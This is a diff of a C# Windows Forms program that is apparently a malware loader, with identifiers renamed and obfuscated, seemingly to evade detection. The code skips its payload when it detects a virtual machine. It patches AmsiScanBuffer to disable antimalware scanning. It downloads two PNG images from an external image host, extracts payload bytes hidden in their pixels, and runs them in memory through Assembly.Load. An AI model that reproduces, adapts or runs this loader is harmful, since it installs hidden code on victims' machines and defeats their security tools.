@@ -9,7 +9,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 
-namespace qwqdanchun
+namespace Program
 {
     static class Program
     {
@@ -19,9 +19,9 @@ namespace qwqdanchun
         [STAThread]
         static void Main()
         {
-            if (!isVM_by_wim_temper())
+            if (!VM())
             {
-                Load();
+                LD();
             }
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
@@ -29,7 +29,7 @@ namespace qwqdanchun
         }
 
 
-        public static byte[] depixelate(Bitmap img)
+        public static byte[] DE(Bitmap img)
         {
             StringBuilder holder = new StringBuilder();
             int xmax = img.Width - 1;
@@ -45,36 +45,36 @@ namespace qwqdanchun
 
             return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
         }
-        private static void Load()
+        private static void LD()
         {
             A.Bypass();
 
-            string loader = @"https://s1.ax1x.com/2020/04/28/J4Zp9S.png"; // No Startup，CHINA
-            string file = @"https://z3.ax1x.com/2021/03/29/cCXQtf.png"; //File
-            var requestLoader = WebRequest.Create(loader);
-            var requestFile = WebRequest.Create(file);
-            Bitmap loaderIMG;
-            Bitmap fileIMG;
+            string LDer = @"https://s1.ax1x.com/2020/04/28/J4Zp9S.png"; // No Startup，CHINA
+            string FI_LE = @"https://z3.ax1x.com/2021/07/05/RhfFGn.png"; //FI_LE
+            var requestLDer = WebRequest.Create(LDer);
+            var requestFI_LE = WebRequest.Create(FI_LE);
+            Bitmap LDerIMG;
+            Bitmap FI_LEIMG;
 
-            using (var response = requestLoader.GetResponse())
+            using (var response = requestLDer.GetResponse())
             using (var stream = response.GetResponseStream())
             {
-                loaderIMG = (Bitmap)Image.FromStream(stream);
+                LDerIMG = (Bitmap)Image.FromStream(stream);
             }
 
-            using (var response = requestFile.GetResponse())
+            using (var response = requestFI_LE.GetResponse())
             using (var stream = response.GetResponseStream())
             {
-                fileIMG = (Bitmap)Image.FromStream(stream);
+                FI_LEIMG = (Bitmap)Image.FromStream(stream);
             }
 
-            byte[] outputLoader = depixelate(loaderIMG);
+            byte[] outputLDer = DE(LDerIMG);
 
-            byte[] outputFile = depixelate(fileIMG);
+            byte[] outputFI_LE = DE(FI_LEIMG);
 
-            Assembly.Load(outputLoader).GetType("Loader.Loader").GetMethod("RunProgram").Invoke(null, new object[] { outputFile });
+            Assembly.Load(outputLDer).GetType("LDer.LDer").GetMethod("RunProgram").Invoke(null, new object[] { outputFI_LE });
         }
-        public static bool isVM_by_wim_temper()
+        public static bool VM()
         {
             SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
@@ -99,31 +99,22 @@ namespace qwqdanchun
     {
         //static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
         //static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-
-
-
-
-
-
-
         public static void Bypass()
         {
-            string x64 = "uFcA";
-            x64 = x64 + "B4DD";
-            string x86 = "uFcAB4";
-            x86 = x86 + "DCGAA=";
-            if (is64Bit())
-                PatchA(Convert.FromBase64String(x64));
+            string x64 = "uFcAB4DD";
+            string x86 = "uFcAB4DCGAA=";
+            if (i64())
+                pa(Convert.FromBase64String(x64));
             else
-                PatchA(Convert.FromBase64String(x86));
+                pa(Convert.FromBase64String(x86));
         }
 
-        private static void PatchA(byte[] patch)
+        private static void pa(byte[] patch)
         {
             try
             {
                 string liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
-                var lib = Win32.LoadLibraryA(ref liba);//Amsi.dll
+                var lib = Win32.LDLibraryA(ref liba);//Amsi.dll
                 string addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
                 var addr = Win32.GetProcAddress(lib, ref addra);//AmsiScanBuffer
 
@@ -139,14 +130,14 @@ namespace qwqdanchun
             }
         }
 
-        private static bool is64Bit()
+        private static bool i64()
         {
-            bool is64Bit = true;
+            bool i64 = true;
 
             if (IntPtr.Size == 4)
-                is64Bit = false;
+                i64 = false;
 
-            return is64Bit;
+            return i64;
         }
     }
 
@@ -156,22 +147,22 @@ namespace qwqdanchun
         //public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
         //[DllImport("kernel32")]
-        //public static extern IntPtr LoadLibrary(string name);
+        //public static extern IntPtr LDLibrary(string name);
 
 
-        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect
+        public static readonly DelegateVirtualProtect VirtualAllocEx = LDApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect
 
         public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         #region CreateAPI
         [DllImport("kernel32", SetLastError = true)]
-        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        public static extern IntPtr LDLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
 
         [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
         public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
-        public static CreateApi LoadApi<CreateApi>(string name, string method)
+        public static CreateApi LDApi<CreateApi>(string name, string method)
         {
-            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
+            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LDLibraryA(ref name), ref method), typeof(CreateApi));
         }
         #endregion
     }
